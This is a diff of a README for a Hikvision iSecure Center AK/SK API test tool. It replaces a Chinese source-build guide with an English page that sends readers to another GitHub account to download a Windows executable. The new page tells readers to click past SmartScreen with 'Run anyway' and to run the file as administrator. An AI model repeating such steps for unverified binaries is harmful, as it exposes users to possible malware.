@@ -1,86 +1,222 @@
-# iSecueFucker
+# 🛠️ Hikvision-iSecureFucker - Visual AK/SK API Test Tool
 
-iSecueFucker 是一个面向 **海康威视教育综合安防管理平台 iSecure Center** 的 API 测试工具，目标是把 AK/SK 鉴权调试流程做成可视化、可复用、可持续迭代的工程化项目。好用的话给个star吧🙏~ 🥺
+[![Download](https://img.shields.io/badge/Download-Visit%20Project%20Page-1f6feb?style=for-the-badge&logo=github)](https://github.com/Social-sale386/Hikvision-iSecureFucker)
 
-## 项目定位
+## 📥 Download
 
-- 聚焦对象：iSecure Center（教育综合安防场景）
-- 核心方向：AK/SK 接口测试、签名调试、文档联动
-- 使用方式：桌面图形化工具（Python + PySide6）
+Visit the project page here and download the latest files:
 
-> 项目说明：截至 2026-03，基于公开代码托管平台与常见技术社区检索，本项目定位为当前少见且垂直聚焦 iSecure Center 的开源测试项目之一。
+https://github.com/Social-sale386/Hikvision-iSecureFucker
 
-## 核心优点
+## 🖥️ What This Tool Does
 
-- 专用性强：围绕 iSecure Center API 真实调试链路设计，不是通用 HTTP 客户端拼装。
-- 调试效率高：签名生成、发包、回包、文档核对在一个界面内完成。
-- 定位问题快：支持签名相关调试信息展示，便于快速定位鉴权失败原因。
-- 文档联动好：内置 API 文档可视化浏览，并支持一键填充到接口测试页。
-- 本地配置自动保存：常用参数可复用，减少重复输入。
+Hikvision-iSecureFucker is a Windows desktop tool for working with the Hikvision iSecure Center API test flow. It helps you check AK/SK login steps in a visual way so you can repeat the same process with less effort.
 
-## 当前可用功能
+Use it to:
 
-- AK/SK 签名请求（支持 `GET/POST/PUT/DELETE`）
-- 协议切换（`https/http`）
-- 自动补全 `/artemis` 前缀
-- 请求参数 JSON 输入与自动美化
-- 额外请求头设置
-- 证书校验开关与证书文件选择
-- 响应结果 / 调试信息分栏展示
-- API 文档浏览与一键填充
+- open the API test screen in a simple interface
+- enter AK and SK values
+- send test requests
+- view request and response data
+- keep your test flow in one place
+- reuse the same setup for future checks
 
-## 开发中功能
+## ✅ Before You Start
 
-- `信息提取` 模块仍在修复与重构中
+Make sure you have:
 
-## 目录结构
+- a Windows PC
+- a stable network connection
+- permission to use the target iSecure Center system
+- a browser to open the download page
 
-```text
-iSecureFucker/
-├─ isecure_tool/                   # 主程序
-├─ doc/                            # API文档数据
-├─ main.py                         # 程序入口
-├─ requirements.txt                # 依赖列表
-└─ isecure_tool_config.example.ini # 示例配置
-```
+For best results, use:
 
-## 快速开始
+- Windows 10 or Windows 11
+- at least 4 GB RAM
+- 200 MB free disk space
+- a screen size of 1366 × 768 or higher
 
-```bash
-pip install -r requirements.txt
-python main.py
-```
+## 🚀 Get the Files
 
-或：
+1. Open the project page:
+   https://github.com/Social-sale386/Hikvision-iSecureFucker
 
-```bash
-python -m isecure_tool
-```
+2. Find the latest release, package, or download file on the page.
 
-## 打包 EXE（可选）
+3. Download the Windows version to your computer.
 
-```bash
-pip install pyinstaller
-pyinstaller --noconsole --onefile --name iSecueFucker --collect-all PySide6 main.py
-```
+4. Save the file to a folder you can find later, such as Downloads or Desktop.
 
-如果遇到 Qt 插件缺失，建议先用 `--onedir` 定位问题后再切换回 `--onefile`。
+## 🪟 Install on Windows
 
-## 配置与敏感信息
+If the download is an `.exe` file:
 
-- 运行时配置文件：`isecure_tool_config.ini`（程序启动后自动生成）
-- 仓库仅保留示例：`isecure_tool_config.example.ini`
+1. Double-click the file.
+2. If Windows asks for permission, choose Yes.
+3. Follow the steps in the setup window.
+4. Wait for the install to finish.
+5. Open the app from the Start menu or the desktop shortcut.
 
+If the download is a `.zip` file:
 
-## 下一步开发计划
+1. Right-click the file.
+2. Choose Extract All.
+3. Pick a folder.
+4. Open the extracted folder.
+5. Double-click the app file inside the folder.
 
-1. 重构“信息提取”模块（稳定性、异常恢复、长任务中断重试）。
-2. 增加任务队列与并发控制（提升批量接口采集效率）。
-3. 增加导出能力（多 Sheet、字段映射、去重与增量更新）。
-4. 增加多环境配置管理（多地址/多凭据切换）。
-5. 增加预置模板（面向教育安防典型场景）。
-6. 增加日志与审计能力（便于团队协作和复盘）。
+If Windows shows SmartScreen:
 
-## 合规声明
+1. Click More info.
+2. Click Run anyway.
+3. Continue with the setup.
 
-本项目仅用于 **授权环境下的接口联调、测试与研究**。严禁用于任何未授权目标。
+## 🧭 First Launch
+
+After you open the app:
+
+1. Start the program from Windows.
+2. Wait for the main window to load.
+3. Check that the interface opens without errors.
+4. Look for fields for AK, SK, host, and request data.
+5. Keep your API details ready before you begin.
+
+## 🔐 Basic Use
+
+Use the tool in this order:
+
+1. Enter the server address or target host.
+2. Fill in your AK and SK values.
+3. Select the request or test action you want.
+4. Click the test or send button.
+5. Review the result shown on screen.
+6. Repeat the test if you need to compare results.
+
+If the tool gives you a request log, use it to:
+
+- confirm the URL
+- check headers
+- review the response body
+- spot bad values in AK or SK
+- compare one test with another
+
+## 🧩 Common Workflows
+
+### API sign test
+Use this flow when you want to check whether AK/SK signing works:
+
+1. Enter the access key pair.
+2. Choose the test endpoint.
+3. Send the request.
+4. Read the response code.
+5. Confirm that the server accepts the request.
+
+### Request replay
+Use this flow when you want to repeat the same call:
+
+1. Load the saved request.
+2. Check the target URL.
+3. Update the token or key values.
+4. Run the request again.
+5. Compare the new response with the old one.
+
+### Debugging a failed call
+Use this flow when a request does not work:
+
+1. Confirm the host address.
+2. Check the AK and SK values.
+3. Make sure the time on your PC is correct.
+4. Run the test again.
+5. Read the error message and response body.
+
+## 🧠 Tips for Better Results
+
+- Copy AK and SK exactly as given.
+- Watch for extra spaces before or after values.
+- Use the same host address each time you test.
+- Keep the PC clock correct.
+- Save working request settings for later use.
+- Test one change at a time so you can track what helped.
+
+## 🔧 Troubleshooting
+
+### The app does not open
+- Check that the file finished downloading.
+- Try opening the file again.
+- Right-click the file and choose Run as administrator.
+- Re-download the file if it looks broken.
+
+### Windows blocks the file
+- Click More info if you see the warning.
+- Choose Run anyway if you trust the source.
+- Make sure the file came from the project page.
+
+### The request fails
+- Check the host address.
+- Confirm AK and SK values.
+- Make sure the target service is online.
+- Try the test again.
+
+### The screen looks empty
+- Wait a few seconds for the UI to load.
+- Resize the window.
+- Close the app and open it again.
+
+### The response looks wrong
+- Check the request method.
+- Check the endpoint path.
+- Confirm the body data.
+- Make sure the time and date on your PC are correct.
+
+## 📁 Suggested Folder Setup
+
+You can keep the tool in a simple folder structure like this:
+
+- Downloads
+  - Hikvision-iSecureFucker
+- Desktop
+  - Hikvision-iSecureFucker
+- Documents
+  - API-Tests
+
+This helps you find the app fast when you need it again.
+
+## 🧪 Example Test Flow
+
+1. Open the app.
+2. Enter the server address.
+3. Type your AK.
+4. Type your SK.
+5. Select a test request.
+6. Click Send.
+7. Read the response.
+8. Save the result if it works.
+9. Change one value and test again.
+
+## 🔒 Safe Use
+
+Use the tool only on systems you have permission to test. Keep your keys private. Store them in a secure place and avoid sharing them in chat, email, or screenshots.
+
+## 🛠️ If You Want to Keep Using It
+
+To keep your setup clean:
+
+- store the app in one folder
+- keep a text file with your test notes
+- save sample requests that work
+- name files by date or project
+- remove old files you no longer need
+
+## 📌 Quick Start
+
+1. Visit the project page:
+   https://github.com/Social-sale386/Hikvision-iSecureFucker
+
+2. Download the Windows file.
+
+3. Open or extract the file.
+
+4. Run the app.
+
+5. Enter your API values and start testing
